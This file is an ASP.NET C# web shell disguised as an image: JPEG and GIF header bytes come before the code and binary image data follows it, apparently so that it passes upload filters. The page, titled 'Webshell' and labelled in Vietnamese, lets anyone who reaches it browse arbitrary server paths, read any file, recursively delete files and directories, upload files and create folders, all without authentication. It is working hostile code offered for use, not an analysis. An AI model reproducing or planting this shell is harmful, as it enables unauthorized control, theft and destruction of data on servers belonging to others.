���� JFIF      �� C 		
 $.' ",#(7),01444'9=82<.342�� C			2!!22222222222222222222222222222222222222222222222222��GIF89a;
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webshell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f4f4f4;
        }
        h2, h3 {
            color: #333;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        li {
            margin-bottom: 10px;
        }
        a {
            text-decoration: none;
            color: #007bff;
        }
        a:hover {
            text-decoration: underline;
        }
        pre {
            background-color: #eee;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
        }
        .actions {
            margin-top: 20px;
        }
        .actions form {
            margin-bottom: 10px;
        }
        input[type="submit"] {
            background-color: #28a745;
            color: #fff;
            border: none;
            padding: 8px 16px;
            cursor: pointer;
            border-radius: 4px;
        }
        input[type="submit"]:hover {
            background-color: #218838;
        }
        input[type="file"], input[type="text"] {
            padding: 8px;
            border-radius: 4px;
            border: 1px solid #ccc;
            width: calc(100% - 20px);
        }
        .error {
            color: #ff0000;
        }
        .success {
            color: #28a745;
        }
    </style>
</head>
<body>
    <script runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {
            try
            {
                string directoryPath = Request.QueryString["dir"];
                if (string.IsNullOrEmpty(directoryPath))
                {
                    directoryPath = Server.MapPath("~/");
                }

                if (!string.IsNullOrEmpty(Request.QueryString["delete"]))
                {
                    string deletePath = Request.QueryString["delete"];
                    if (Directory.Exists(deletePath))
                    {
                        Directory.Delete(deletePath, true);
                        Response.Write("<p class='success'>Thu muc da bi xoa: " + deletePath + "</p>");
                    }
                    else if (File.Exists(deletePath))
                    {
                        File.Delete(deletePath);
                        Response.Write("<p class='success'>Tep da bi xoa: " + deletePath + "</p>");
                    }
                }

                if (Request.HttpMethod == "POST")
                {
                    if (Request.Form["newDir"] != null)
                    {
                        string newDirPath = Path.Combine(directoryPath, Request.Form["newDir"]);
                        Directory.CreateDirectory(newDirPath);
                        Response.Write("<p class='success'>Thu muc moi da duoc tao: " + newDirPath + "</p>");
                    }

                    if (Request.Files["fileUpload"] != null)
                    {
                        HttpPostedFile uploadedFile = Request.Files["fileUpload"];
                        string savePath = Path.Combine(directoryPath, Path.GetFileName(uploadedFile.FileName));
                        uploadedFile.SaveAs(savePath);
                        Response.Write("<p class='success'>Tep da duoc tai len: " + savePath + "</p>");
                    }
                }

                string[] directories = Directory.GetDirectories(directoryPath);
                string[] files = Directory.GetFiles(directoryPath);

                Response.Write("<h2>Thu muc hien tai: " + directoryPath + "</h2>");
                Response.Write("<h3>Thu muc:</h3>");
                Response.Write("<ul>");
                foreach (string dir in directories)
                {
                    string dirName = Path.GetFileName(dir);
                    Response.Write("<li><a href='?dir=" + dir + "'>" + dirName + "</a> - <a href='?delete=" + dir + "' style='color: red;'>Xoa</a></li>");
                }
                Response.Write("</ul>");

                Response.Write("<h3>Tep:</h3>");
                Response.Write("<ul>");
                foreach (string file in files)
                {
                    string fileName = Path.GetFileName(file);
                    Response.Write("<li><a href='?viewfile=" + file + "'>" + fileName + "</a> - <a href='?delete=" + file + "' style='color: red;'>Xoa</a> - <a href='" + file + "' download>Download</a></li>");
                }
                Response.Write("</ul>");

                if (!string.IsNullOrEmpty(Request.QueryString["viewfile"]))
                {
                    string filePath = Request.QueryString["viewfile"];
                    Response.Write("<h3>Xem tep: " + Path.GetFileName(filePath) + "</h3>");
                    string fileContent = File.ReadAllText(filePath);
                    Response.Write("<pre>" + Server.HtmlEncode(fileContent) + "</pre>");
                }

                Response.Write("<div class='actions'>");
                Response.Write("<form action='' method='post' enctype='multipart/form-data'>");
                Response.Write("<h3>Tai len tep:</h3>");
                Response.Write("<input type='file' name='fileUpload' />");
                Response.Write("<input type='submit' value='Tai len' />");
                Response.Write("</form>");

                Response.Write("<form action='' method='post'>");
                Response.Write("<h3>Tao thu muc moi:</h3>");
                Response.Write("<input type='text' name='newDir' placeholder='Ten thu muc moi' />");
                Response.Write("<input type='submit' value='Tao thu muc' />");
                Response.Write("</form>");
                Response.Write("</div>");
            }
            catch (Exception ex)
            {
                Response.Write("<p class='error'>Loi: " + ex.Message + "</p>");
            }
        }
    </script>
</body>
</html>


</head>
<body>
    <form id="form1" runat="server">
    </form>
</body>
</html>
��  � �" ��           	
�� �   } !1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������        	
�� �  w !1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? �T����Z�$e0��
��,˸��1��\���H�"���9犺�� w^M1�� [���,2�JE$b�w99�594��$PO�L��sN*H�#� �L�U�m4����֝$eG��1���K�'��+�@ �J�1;������ .A����A�/#ި�í>9�q�P5R�Y���pzI%�PD������$�_3Mf�0�&G�"�H���`��UYYN�֥cl�b�{��"��)�Md1�EN'V��QM���r��������#TG����Y�4NhIJ���NӉP��}h�❜�"m4��EE&( �!��n(�m��4�FKb�`��0���L���Qa����v�P�zR,���''��������U�w���<�I1w�LW ��ӊ�ӂ��s�A#X`U�@��Z��⥷f�U�0h)-�����M��d�Z|��HH�QZv�^ǆu��0c��`A���ĘW���ӚX|²ʲ`[���!�w'��4x�~�<W�� �W�����p��1ҁ㐡ⴡ�I#��PsުMh�ʍ�׊�T����Z76@'����8?��:d�Y��XnƁ���g�"	9{�S$�Z�΀! ��zP�u���֡ ��$'p��Z\��bf���E 8�d��g�x=�7{QK�j(y<��,Uv�ت�N�>S�n�0��ݜ�>�VG�#�#��u
w =�C#�ԇ"��i�=�'�@:��C��)9<��ޫ���D�z�TNKⷬ#I�y8#��qW(C �-���M�w��0�ޣ����H:�Nr�G�u�"�lt	q�YI����+�6Hݹ�Uh�{vʒ*�+��?��Q`l�e*qJ����NpF1P��LE���9�9N]@'���R�9�R@�P�_aSN0�Nޭր&t4����4���J)b4�nd�4�9iR�h��R�@����Z��>[���$⁤W�������\,Z�C�"#��gc�x<
Y%v<��B]�gڀ�n���Lc�@	��v@��n�ƪ�Մb�c�����0ݜV��tb����灜Vu�qt�)�c��t�	�'��WQsj���:RmB-�r��6�
CnF�2�+-$(�t�z��Er���l9�(H���������>ؤSӚ�۔c@�Lrxj�X�sD����	750�܎)�'k�=})�w-L�����Q@ǵ���a֢0�NQ�I�[���U�KG��� =i���uh�$~����ͽ�B�q�V �LD��Wn-2�hL��@�$�HN����,�h��E6�%&h�@\Zr�S�84��@�K����EG�(��r	�B_�����+o�+l��4��sۚ�J��RN�J->� �i1��dܱ�e�}�(F����rKiZ+�u8e9���Z����Y&Qol�#	^�����dp��;;��6�f�G���&�\%c޼E�Z�l&�7��6���=��Wus ?6�\��ŝn�J��H�j<E|��J�!�ju.��/���[	�01��>�汫#>�⺈c�uy��/$���['5u�}z��V�<��N�`�[�#.��ux����  �[�z�����7��ˀk�<-�^xj{mm 3�d��%>xNy8��e�NӼE��(�d��� ��PIj|o�*H�r��O�?�t�2�I���$��H=�k�^�H�Ojӹ�M�\��@W��mgӯ�{v�P�-��-�\엧c�[6�7Gj��Ͻ�nvz���)g����3����߯}*���� �r�k!{�g�q�γ�� �z$���_�
ܗ�F��}�[��J�Rj�;��#C�E��&uRr��^��Ews+" �8�j�&ԼA9733��GJ�&�qoo�N���#"������3��)�i*�F�J	��B�AN��QR�-�?:(�����Qs����+o$-FNܞ3�ָ>Y���)c��W�ǧ�>!\���Ydcoֹ�/K�_j6sʋm=�1ϡ���j�<픨9�Z:͚��WV��9T��g�� U��X)�r��@ƥ���^����(�KK�����ϽyލKs��2����^��m:mCwn7��]����nU�#Y͝֍���3��;���2� ��Sß���Y�)��?p+�l�Y���2
��>�f������c6�C���X���T�*�0G�T�x84�5J(M�g6����8�vo�U��[K���O�d9h;#z�����))r��v���BK��� <��W����-��Gz�O��H�>�7�/�.eWPHb#�f�gE$�K��&���+�u�pU�8 }+l�)�4{��N�K��W]~��G�K��kq�/�k�n@qOV������X�-��������;����&;��
׶<JO̢�h�8ℚ2s���o;M�$��<`b�>"�Y�,!]�9��ڦ@��x���<�8������4��]3��Js�6)����(4S$)sIF(o4�Q�Hu��e��%�O�]�J��T�E��t����^F�YW����+��$��oq-�'x�c�O�G�u^.ҵ+�>�������T�q�0��J���'�Ck���=�5�`�m�XM'��Q�"���k���{[��A�S�T��� �>0����ҧZdY˧�6�����G���_Cx %�����`���~�ל�k@� ����B��9���V�?�z_��ψ���][���?f����ԕ����1�m�&2}=+c�BЉ0O^���A��*��n�~q�2i3FqLB�N���y���#��/� �M^qs/�^f'xbNk�|K�D� ��ׁj
��'<�knu��K:u��Wh� h`��z��&�������+��/�ɫ�D��-��z׹�ڭ��p��U S���j�'<���s�1
��r�� $���%���<����ֽ�S����Id`T�����ƚ��u�.B�]�O�j:��g7��Ǯ*1Or�z�3[1��hr�M���Y�RV?֝�I��u"����GJ����Ĳ�2��C��E.(����}�(�r�Y�>7?��8�.��_�7������*�h��m���GZ�� ��}��V7L�o�|�'����@��]�pEr�FGCI-b��0���yy˹P��3�G��|Fэ���b�r�r����z��k4g�Ւ9�YH����Fx�������ɣ�R%�� �� �4�f����F|�g4�־�l.5X�*X8a�z�j����7�C"�Q�ϥU���+��C�S����
Jq��l�z����1���U ��#�־>���8�=����5�)�}� ǯ�GSGw�x8�Ԕ�Ҝ*�Ţ�Z`G,�l�p�2x�����򖵸I@���dg�8�CK�K�u�r�W���Rw�R��[=���@ǿ�v��Ԯ����e���}��f���ʻ�9��,ǀ�����T�V0�3�}�"�ndS[��b�
��Cm��*�gXлS�RI�.�ǌwy�}�0^VIaJN�BL����Ѩ�4�9?ѣ8�@~���������N��.�|�sZ��LO�)ER�Y�'j����Zdk�E_SZ�`d׸|;�Oۼ8�LH�a��	� �W�iv�{��n��#���_[�b�;=�=�x�:Rz�us6���>���k)�H�ҹ�2d��<��lv����|K�-sM���Ք��?�|��
]xkRx�����F��y��;߱[� �U?����c}� �)Y��G|E�c�%�i7��T�~x�/ �=߅ ɓr���{?�tz������R'2�NPp1\ׄ,����:P�#�]0a������b�a��}.��m�,�����F�c,�=�Wɘ��`z��c��߈,�P򜵴��B�Q�V�
�Z���E�S��g����CE'k:�Q3��Lpr�?���#���⿆6�Y08�4�Y�����2�P�:�z���f�M��O��M��w�x���+Zǀ�Dc0M��\J�=���z�s��@ Ow���a��u"��r#�� ��OV��e���ܸ�h})��v�֟�,x#?t�V�9���+⫝�m�F~���k�tmb�W�����V���Ӌ��jBڭ�Pi3�@sU�#�hY �B�����U�f�̨ ~����<�Ò��=��u2�웃l����V?xb������C�3��j9�}�{3���0�l�y���֬4� �����L��L�:'������dZ��G����=p̓��~��7N��N�K�y��%	7k<i�_����������i��=_յ)��.$l�bqXwH��z�s�.X��o6O/8���zV>�k$�0½X�WGih�H ��].��&�ץwm���#�Z0�隮k�}�*ԭ�T"��žf$���Vω`0]�A�!UM�^� �@Z��0q��u_
th�L���HFA�5���ǲ�O��h��d$+s�G�^{��Q�xuo&H�63�;��xw^��|u�ȍ��8� ��J�����M�1���
��]�[����T-�W<}k�B�۱xt�F�I$��q��# U��Jǈ�� ������(�(�!E2�5�@�.zv��CR��ʘ�p2OQ�s����w���Ԕ�銰����	أ�B�v�ù0�2c�5��A�-��G��c��?�J�b& �W��<�����E��� ������&iU�_i� hӴ����nʒ��?������_�s�m /n�u'�j���/5�i�3G��rTck~�?�T��^��fS�]F9\ q�b3PѶ�ü�%7#W�L�|������q^u(6��W�6����ht+,N���x�����j��!3��u5M�Y�sm��_~+��'��.����c�!<��a`���1`� m=�}7�j�j�Q�@�9��5�FGJ�� ��.�C�D��[1���5�zf�o��%ż��� �'��9]���Z���(J�#_�
���^�r��ք����#���6R�1�׾3ִ+�,DL.�\�;��|]�j����#9��|@�I�O7��lz�\�0,x8�Sc�w-I1G����}��1�5��Ȫ�Wi6�ר���ɤ���:ԡF9#'��!�~��ۇ��<��{�#��~����s0 �e>�����Ѵ�%`���ʇ��Y�*��ꊡ�m!���x��� OBG˟�����Ѧ�7p�36����'�4��T��'�� %���j!��d?�Iⸯ��7�V��#�G�ܓ�G�^��4Y�1w��[�(������W�H����O'��.�d9���~�V��Z�������6�\2Q$�@ (<�5��E��UmI��R ��w9#��8�=_D��'�����Ie�Ƈ��'��W��E��Vї	on��$���)�-M��*���	��;}?ɩF=�I�}kC����T��Q@�:���lG���϶>��5DY��P:�QR�m"��#!��f@+��ݫ�o�Q���u��}�Pˆ�'u��WJ��F�Les�x�:�<O&������p2��+��\�E&�6��G��k`���1��>��<Q��x�H[�DS,?��^��Tȸ-ny̗$e<���rF?J��c�D`�#'�E�'~�Q�!L��g5�x7�7:�&��v�Мq��h��������/Y��!0N��y�ު���i\�	��wZ�)_C(�s�����/���bK��52�~p=y��GCdl�0��z��)����E1\�Ҫ���<U�2����9$;�X1Q��Q@^��Okm��o�X�5\�@�=3�k��ԭ�bc�!p3�p�E�v9����o!Okk��PF�'�OOƳ h����%k٢^z.z�X��F��j|=��Y.5K��;�������5�kyj�X��)�c�� �[��"�����u��s��(���v"���� �������(#��